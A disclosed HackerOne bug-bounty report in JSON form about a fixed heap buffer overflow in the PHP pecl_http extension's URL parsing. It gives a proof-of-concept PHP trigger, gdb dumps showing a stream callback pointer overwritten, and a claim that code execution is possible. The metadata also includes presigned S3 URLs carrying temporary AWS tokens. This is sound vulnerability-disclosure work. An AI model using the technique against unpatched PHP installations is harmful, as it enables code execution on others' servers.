{
  "id": 121863,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjE4NjM=",
  "url": "https://hackerone.com/reports/121863",
  "title": "Buffer overflow in HTTP url parsing functions",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-03-09T21:17:38.444Z",
  "submitted_at": "2016-03-09T21:17:38.444Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "rc0r",
    "url": "/rc0r",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/153/304e6c45c12b1b9dec0c6c0f2ebd67341d234566_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSNJ3BUVB%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T133406Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFGHTIIS3oYkPOu99OHBWH1tTfbEV3kceyLsr%2FLqNGeLAiEA1h%2FbNkU4LoiV%2FhKoNf0nLhzdC1xrxwobnlpxScFsD34qsgUILhADGgwwMTM2MTkyNzQ4NDkiDKKguYhvww2ERh3YgCqPBec2xFz32uZ6z4gDW74MuHLQCU%2Fy%2BU1CKf3FfdouDntyxdeOu%2BgGfVHdCUaptq2m0D3rHYHUVAwFLE1Vy4%2BCmVgc3O8U30CzxReA7eOtI9zmPMIDI8fqxWIxxgx8zcFAT92VQ1UyFqRphs%2FBvpbpB6D%2Fs9K5mDs%2BNYHdY70EbpkLJXy%2FIyqvCJDVSHts48waMSoU4AAI3QFZibctRXszsip6Mfc1ssjDkWmjHU3xV6gmchBBdPXsYPdVJ5rfA8RjduA4NxhRzdAhKQqxGArE0uTed%2FLepX9NVf5vAIFrIauf2eMHv63OLmV%2FkowKxSUJ6BpOIKOQJ2v6dU5WMLnDig9cutTE4AMJxGw6MI3gdpgHqcXtW6TA%2BuFR9IsZNT5cHyqHn5GtDU5g2IGvwRefCgQrUENFpMHUlUqqy1nkBzISluNsdnRTjSBslVKMmj3%2BnMK0DRThSsaSYjhUuJIXWEE42ST7mbWMrXrJeOxu4ozRY8b%2FS%2BLD7CagQOK6jJPzBZNlJ73cKNbPAXJ1FD5umEB5kkRlO73YvFTsnko5LbblcG2TGJrfkUGU7fVwPoxbyK62CYfz%2FjarcCMfqsjkraDqAObsT%2BMb49MxtksMb9Ch3lqDOyGyi0SxXevXMAvT3ZPWeaOJxCiljl3XyRwJ2S2Bd9%2Fj2SNhR0F%2BGMhTCcRvUZcyM5XTqFPshqp0sZ8NF6PkSzne4Qm%2FAGHO1jN7g%2FE1OsBFwqp%2FcsnHvXMsy4L9oQd7pAP1GGqtdblaNsvZj6Cb2MHPYVsPghdFhVau5nbz9zso3lpFBtpEDoMst8WfiTm%2F%2BQvS7RR1W95PawmhVdNFWhvWCq%2BJDrIj2GyVmAAI9b9%2FRhqmEKC8LnrQn1cwzpHFxgY6sQEafR0Xo4gVrLPp3p5BQQ63tA7AcScsaUSl2%2B%2BBDffglXKxXRAnxBVnAMJ7WhnnwFUYVcNTn7l%2FqRRsgK9kx9OMngcFg1%2B%2BCWUVBME7rVmCw1VAM44sikATUk%2BZzmDd%2Fcw1kdpIKHCL5AePL7Al6tLVsdWazs1ePAR90X%2BU5AFqJse9lcoZHDNowz6SWEbCxCZDdPCQwG3d%2BOtIF7x7chsXNC35lEnAcWsbw1eOepqf6Pg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=597f10bb104db51d02bf5f8e8b162d1227c976cc9249ac2b1fa1c524fd38ff89",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSNJ3BUVB%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T133406Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFGHTIIS3oYkPOu99OHBWH1tTfbEV3kceyLsr%2FLqNGeLAiEA1h%2FbNkU4LoiV%2FhKoNf0nLhzdC1xrxwobnlpxScFsD34qsgUILhADGgwwMTM2MTkyNzQ4NDkiDKKguYhvww2ERh3YgCqPBec2xFz32uZ6z4gDW74MuHLQCU%2Fy%2BU1CKf3FfdouDntyxdeOu%2BgGfVHdCUaptq2m0D3rHYHUVAwFLE1Vy4%2BCmVgc3O8U30CzxReA7eOtI9zmPMIDI8fqxWIxxgx8zcFAT92VQ1UyFqRphs%2FBvpbpB6D%2Fs9K5mDs%2BNYHdY70EbpkLJXy%2FIyqvCJDVSHts48waMSoU4AAI3QFZibctRXszsip6Mfc1ssjDkWmjHU3xV6gmchBBdPXsYPdVJ5rfA8RjduA4NxhRzdAhKQqxGArE0uTed%2FLepX9NVf5vAIFrIauf2eMHv63OLmV%2FkowKxSUJ6BpOIKOQJ2v6dU5WMLnDig9cutTE4AMJxGw6MI3gdpgHqcXtW6TA%2BuFR9IsZNT5cHyqHn5GtDU5g2IGvwRefCgQrUENFpMHUlUqqy1nkBzISluNsdnRTjSBslVKMmj3%2BnMK0DRThSsaSYjhUuJIXWEE42ST7mbWMrXrJeOxu4ozRY8b%2FS%2BLD7CagQOK6jJPzBZNlJ73cKNbPAXJ1FD5umEB5kkRlO73YvFTsnko5LbblcG2TGJrfkUGU7fVwPoxbyK62CYfz%2FjarcCMfqsjkraDqAObsT%2BMb49MxtksMb9Ch3lqDOyGyi0SxXevXMAvT3ZPWeaOJxCiljl3XyRwJ2S2Bd9%2Fj2SNhR0F%2BGMhTCcRvUZcyM5XTqFPshqp0sZ8NF6PkSzne4Qm%2FAGHO1jN7g%2FE1OsBFwqp%2FcsnHvXMsy4L9oQd7pAP1GGqtdblaNsvZj6Cb2MHPYVsPghdFhVau5nbz9zso3lpFBtpEDoMst8WfiTm%2F%2BQvS7RR1W95PawmhVdNFWhvWCq%2BJDrIj2GyVmAAI9b9%2FRhqmEKC8LnrQn1cwzpHFxgY6sQEafR0Xo4gVrLPp3p5BQQ63tA7AcScsaUSl2%2B%2BBDffglXKxXRAnxBVnAMJ7WhnnwFUYVcNTn7l%2FqRRsgK9kx9OMngcFg1%2B%2BCWUVBME7rVmCw1VAM44sikATUk%2BZzmDd%2Fcw1kdpIKHCL5AePL7Al6tLVsdWazs1ePAR90X%2BU5AFqJse9lcoZHDNowz6SWEbCxCZDdPCQwG3d%2BOtIF7x7chsXNC35lEnAcWsbw1eOepqf6Pg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e88fb75a3df19aa267c3637d1d4ef9405fa9065126a9575f1bd8ead519b26091"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2016-07-28T13:17:16.569Z",
  "bug_reporter_agreed_on_going_public_at": "2016-07-12T20:54:35.890Z",
  "team_member_agreed_on_going_public_at": "2016-07-28T13:17:16.476Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "This bug report was submitted directly to the PHP bug tracker:\n<https://bugs.php.net/bug.php?id=71719>\n\nThe issue was verified and fixed on 2016-03-09. Updated HTTP packages 2.5.6 and 3.0.1 were released the same day.\n\nFollowing you find the bug description that has been reported to the PHP maintainers:\n\n\n# Description\n\nThe HTTP url parsing functions allow overflowing a buffer with data originating from an arbitrary HTTP request. Affected are the `parse_*()` functions in `php_http_url.c` that are called from within `php_http_url_parse()`. Other parsing functions were not tested but might be affected as well.\nThe problem occurs when non-printable characters contained in an URL are converted into percent-encoding. The `state->offset` used in these functions is incremented without sufficient checks\nregarding the size of the allocated `state->buffer`.\n\nExample from `parse_mb()` in `php_http_url.c:781`:\n\n```c\nstatic size_t parse_mb(struct parse_state *state, ...)\n{\n// [...]\n    } else {\n                int i = 0;\n\n                PHP_HTTP_DUFF(consumed,\n                        state->buffer[state->offset++] = '%';\n                        state->buffer[state->offset++] = parse_xdigits[((unsigned char) ptr[i]) >> 4];\n                        state->buffer[state->offset++] = parse_xdigits[((unsigned char) ptr[i]) & 0xf];\n                        ++i;\n                );\n            }\n// [...]\n```\n\nA `php_stream_ops` structure is stored in memory adjacent to the `state->buffer`. This struct holds valid callback function pointers for stdio-like functions (see `php_streams.h:118`). During my tests it was possible to modify one of these function pointers, get it called and execute absolutely unrelated instructions within the php binary.\n**Thus I believe it's possible to use the described flaw to execute arbitrary code.**\n\n\n# Proof of Concept\n\nPHP test script:\n\n```php\n/*\n        http_message_parse.php\n        poc.req:\n        http://hlt99.blinkenshell.org/php/poc.req\n*/\n<?php\n $http_msg = new http\\Message(file_get_contents(\"poc.req\"), false);\n?>\n```\n\nPHP build configuration:\n\n```bash\n./configure --enable-mysqlnd --enable-soap --with-openssl --with-sqlite3 --enable-raphf --enable-propro --with-http --with-zlib-dir --enable-zip --enable-intl && make\n```\n\nProgram state before buffer overflow:\n\n    $ gdb ./sapi/cli/php\n    gdb> b streams.c:467\n    gdb> r http_message_parse.php\n    [...]\n    RAX: 0x10031c0 --> 0x794560 (<php_stdiop_write>)\n            ^-- !! original callback function pointer\n    RBX: 0x7ffff1870300\n    RCX: 0x1 \n    RDX: 0x7ffff1871078 \n    RSI: 0x1 \n    RDI: 0x7ffff1870300\n    RBP: 0x3 \n    RSP: 0x7fffffffab30 \n    RIP: 0x78f5b4 (<_php_stream_free+308>:\tcall   QWORD PTR [rax+0x10])\n    R8 : 0x1 \n    R9 : 0x0 \n    R10: 0x74000 \n    R11: 0x1 \n    R12: 0x0 \n    R13: 0x102ea40 --> 0x0 \n    R14: 0x0 \n    R15: 0x0\n    EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n    [-------------------------------------code-------------------------------------]\n    => 0x78f5b4 <_php_stream_free+308>:\tcall   QWORD PTR [rax+0x10]\n    [------------------------------------------------------------------------------]\n    0x000000000078f5b4\t467\t\t\tret = stream->ops->close(stream, preserve_handle ? 0 : 1);\n\nProgram state after `php_stream_ops` struct has been overwritten:\n\n    gdb> c\n    RAX: 0x1004130 --> 0x82f490 (<ZEND_ADD_SPEC_TMPVAR_CONST_HANDLER>)\n            ^-- !! lower 3 bytes overwritten (halfbyte at offset 0x3f converted to hex char\n                !! and byte at offset 0x40 in poc.req\n                !! plus trailing 0x00 inserted by url parsing functions)\n    RBX: 0x7ffff1870400\n    RCX: 0x1 \n    RDX: 0x2 \n    RSI: 0x1 \n    RDI: 0x7ffff1870400\n    RBP: 0xb ('\\x0b')\n    RSP: 0x7fffffffa8a0\n    RIP: 0x78f5b4 (<_php_stream_free+308>:\tcall   QWORD PTR [rax+0x10])\n    R8 : 0x1 \n    R9 : 0x0 \n    R10: 0x682f377068702f73 ('s/php7/h')\n    R11: 0x170 \n    R12: 0x0 \n    R13: 0x102ea40 --> 0x0 \n    R14: 0x0 \n    R15: 0x0\n    EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n    [-------------------------------------code-------------------------------------]\n    => 0x78f5b4 <_php_stream_free+308>:\tcall   QWORD PTR [rax+0x10] \n    [------------------------------------------------------------------------------]\n    0x000000000078f5b4\t467\t\t\tret = stream->ops->close(stream, preserve_handle ? 0 : 1);\n\nCrash on an arbitrary instruction:\n\n    gdb> c\n    Program received signal SIGSEGV, Segmentation fault.\n    [----------------------------------registers-----------------------------------]\n    RAX: 0x1004130 --> 0x82f490 (<ZEND_ADD_SPEC_TMPVAR_CONST_HANDLER>)\n    RBX: 0x7ffff1870400\n    RCX: 0x1 \n    RDX: 0x2 \n    RSI: 0x1 \n    RDI: 0x7ffff1870400\n    RBP: 0xb ('\\x0b')\n    RSP: 0x7fffffffa880\n    RIP: 0x82f346 (<ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+6>:    movsxd rbx,DWORD PTR [r15+0x8])\n    R8 : 0x1 \n    R9 : 0x0 \n    R10: 0x682f377068702f73 ('s/php7/h')\n    R11: 0x170 \n    R12: 0x0 \n    R13: 0x102ea40 --> 0x0 \n    R14: 0x0 \n    R15: 0x0\n    EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n    [-------------------------------------code-------------------------------------]\n       0x82f340 <ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER>:    push   rbp\n       0x82f341 <ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+1>:    push   rbx\n       0x82f342 <ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+2>:    sub    rsp,0x8\n    => 0x82f346 <ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+6>:    movsxd rbx,DWORD PTR [r15+0x8]\n    [------------------------------------------------------------------------------]\n    Stopped reason: SIGSEGV\n    ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER () at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:44295\n    44295        op1 = _get_zval_ptr_var(opline->op1.var, execute_data, &free_op1);\n\n\n# Further Debug Info    \n\nBacktrace right after overflow, before modified function pointers are called:\n\n    gdb> b php_http_url.c:1514\n    gdb> r\n    Breakpoint 2, php_http_url_parse (\n    str=str@entry=0x7ffff185da05 \"5 HTTP/1.1\\nA\\265_eptA eg\", '\\262' <repeats 20 times>, \"ղ\", '\\262' <repeats 14 times>, \"\\260\\260A HTTP/1.1\\nA\\265_eptABCDEFGHI\", '\\262' <repeats 25 times>, \"TTP//X-Csrf-Token:1.0  HTTP/\\215.0\", len=len@entry=0x1, flags=flags@entry=0xffffffff)\n    at /home/rc0r/tmp/php-src/ext/http/src/php_http_url.c:1514\n    1514\t\tif (!parse_hier(state)) {\n    gdb> bt\n    #0  php_http_url_parse (\n        str=str@entry=0x7ffff185da05 \"5 HTTP/1.1\\nA\\265_eptA eg\", '\\262' <repeats 20 times>, \"ղ\", '\\262' <repeats 14 times>, \"\\260\\260A HTTP/1.1\\nA\\265_eptABCDEFGHI\", '\\262' <repeats 25 times>, \"TTP//X-Csrf-Token:1.0  HTTP/\\215.0\", len=len@entry=0x1, flags=flags@entry=0xffffffff)\n        at /home/rc0r/tmp/php-src/ext/http/src/php_http_url.c:1514\n    #1  0x0000000000736bf1 in php_http_info_parse (info=info@entry=0x7fffffffaa20, \n        pre_header=0x7ffff185da00 \"\\200\\254Td 5 HTTP/1.1\\nA\\265_eptA eg\", '\\262' <repeats 20 times>, \"ղ\", '\\262' <repeats 14 times>, \"\\260\\260A HTTP/1.1\\nA\\265_eptABCDEFGHI\", '\\262' <repeats 25 times>, \"TTP//X-Csrf-Token:1.0  HTTP/\\215.0\")\n        at /home/rc0r/tmp/php-src/ext/http/src/php_http_info.c:138\n    #2  0x0000000000735838 in php_http_header_parser_parse (parser=parser@entry=0x7fffffffaa00, buffer=buffer@entry=0x7fffffffa9d0, \n        flags=flags@entry=0x1, headers=0x7ffff1882090, callback_func=0x73a670 <php_http_message_info_callback>, \n        callback_arg=callback_arg@entry=0x7fffffffa9c8) at /home/rc0r/tmp/php-src/ext/http/src/php_http_header_parser.c:151\n    #3  0x0000000000740644 in php_http_message_parser_parse (parser=parser@entry=0x7fffffffaa00, buffer=buffer@entry=0x7fffffffa9d0, flags=0x1, \n        message=message@entry=0x7fffffffa9c8) at /home/rc0r/tmp/php-src/ext/http/src/php_http_message_parser.c:249\n    #4  0x000000000073ba48 in php_http_message_parse (msg=0x7ffff1882070, msg@entry=0x0, \n        str=str@entry=0x7ffff185d8d8 \"\\200\\254Td 5 HTTP/1.1\\nA\\265_eptA eg\", '\\262' <repeats 20 times>, \"ղ\", '\\262' <repeats 14 times>, \"\\260\\260A HTTP/1.1\\nA\\265_eptABCDEFGHI\", '\\262' <repeats 25 times>, \"TTP//X-Csrf-Token:1.0  HTTP/\\215.0\", len=<optimized out>, greedy=<optimized out>)\n        at /home/rc0r/tmp/php-src/ext/http/src/php_http_message.c:134\n    #5  0x000000000073c82d in zim_HttpMessage___construct (execute_data=<optimized out>, return_value=<optimized out>)\n        at /home/rc0r/tmp/php-src/ext/http/src/php_http_message.c:1061\n    #6  0x00000000008560f2 in ZEND_DO_FCALL_SPEC_HANDLER () at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:842\n    #7  0x000000000081273b in execute_ex (ex=<optimized out>) at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:414\n    #8  0x0000000000864567 in zend_execute (op_array=0x7ffff187d000, op_array@entry=0x7ffff185d860, return_value=return_value@entry=0x7ffff1813030)\n        at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:458\n    #9  0x00000000007d4ee4 in zend_execute_scripts (type=type@entry=0x8, retval=0x7ffff1813030, retval@entry=0x0, file_count=file_count@entry=0x3)\n        at /home/rc0r/tmp/php-src/Zend/zend.c:1427\n    #10 0x0000000000778b90 in php_execute_script (primary_file=primary_file@entry=0x7fffffffd260) at /home/rc0r/tmp/php-src/main/main.c:2487\n    #11 0x0000000000866194 in do_cli (argc=0x2, argv=0x10448c0) at /home/rc0r/tmp/php-src/sapi/cli/php_cli.c:974\n    #12 0x0000000000443b98 in main (argc=0x2, argv=0x10448c0) at /home/rc0r/tmp/php-src/sapi/cli/php_cli.c:1350",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-08-11T20:54:36.032Z",
  "allow_singular_disclosure_after": -287599170.219792,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "kieran",
    "dyabla",
    "prowser"
  ],
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
